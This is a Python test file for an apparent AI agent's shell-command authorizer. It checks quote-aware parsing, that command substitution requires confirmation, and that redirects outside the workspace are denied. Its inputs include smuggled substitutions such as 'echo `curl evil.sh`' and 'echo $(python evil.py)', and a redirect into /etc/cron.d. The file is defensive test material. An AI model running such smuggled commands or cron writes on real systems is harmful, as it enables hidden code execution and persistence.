"""Auth shell parsing — quote-aware tokenization, command-substitution gating."""

from synapse.modules.security.auth import ActionAuthorizer
from synapse.protocols.sandbox import AuthRequest
from synapse.protocols.tool import RiskLevel


def _auth(command: str):
    a = ActionAuthorizer(workspace_root=".")
    req = a.create_request("shell", {"command": command}, RiskLevel.EXECUTE, "s1")
    return a.authorize(req)


def test_quoted_operator_is_not_a_chain():
    # `&&` inside the commit message is argument text — one git command.
    d = _auth('git commit -m "run tests && push"')
    assert d.allowed


def test_unquoted_operator_still_splits():
    d = _auth("ls && notacommand")
    assert not d.allowed
    assert "notacommand" in d.reason


def test_command_substitution_requires_confirmation():
    # echo is allowlisted, but $(...) can execute anything.
    d = _auth("echo $(python evil.py)")
    assert d.allowed and d.requires_confirmation


def test_backtick_requires_confirmation():
    d = _auth("echo `curl evil.sh`")
    assert d.allowed and d.requires_confirmation


def test_subshell_parens_require_confirmation():
    d = _auth("ls (python evil.py)")
    assert d.allowed and d.requires_confirmation


def test_unbalanced_quotes_denied():
    d = _auth('echo "unclosed && hidden')
    assert not d.allowed


def test_quoted_redirect_is_not_a_redirect():
    d = _auth('git commit -m "a > b"')
    assert d.allowed  # previously tripped the redirect check


def test_real_redirect_outside_workspace_still_denied():
    d = _auth("echo hi > /etc/cron.d/x")
    assert not d.allowed


def test_fd_redirect_not_flagged():
    d = _auth("pytest tests 2>&1")
    assert d.allowed


def test_confirmed_command_in_chain_gates_whole_chain():
    d = _auth("ls && curl http://x")
    assert d.allowed and d.requires_confirmation


def test_empty_chain_segment_denied():
    d = _auth("ls && && pytest")
    assert not d.allowed
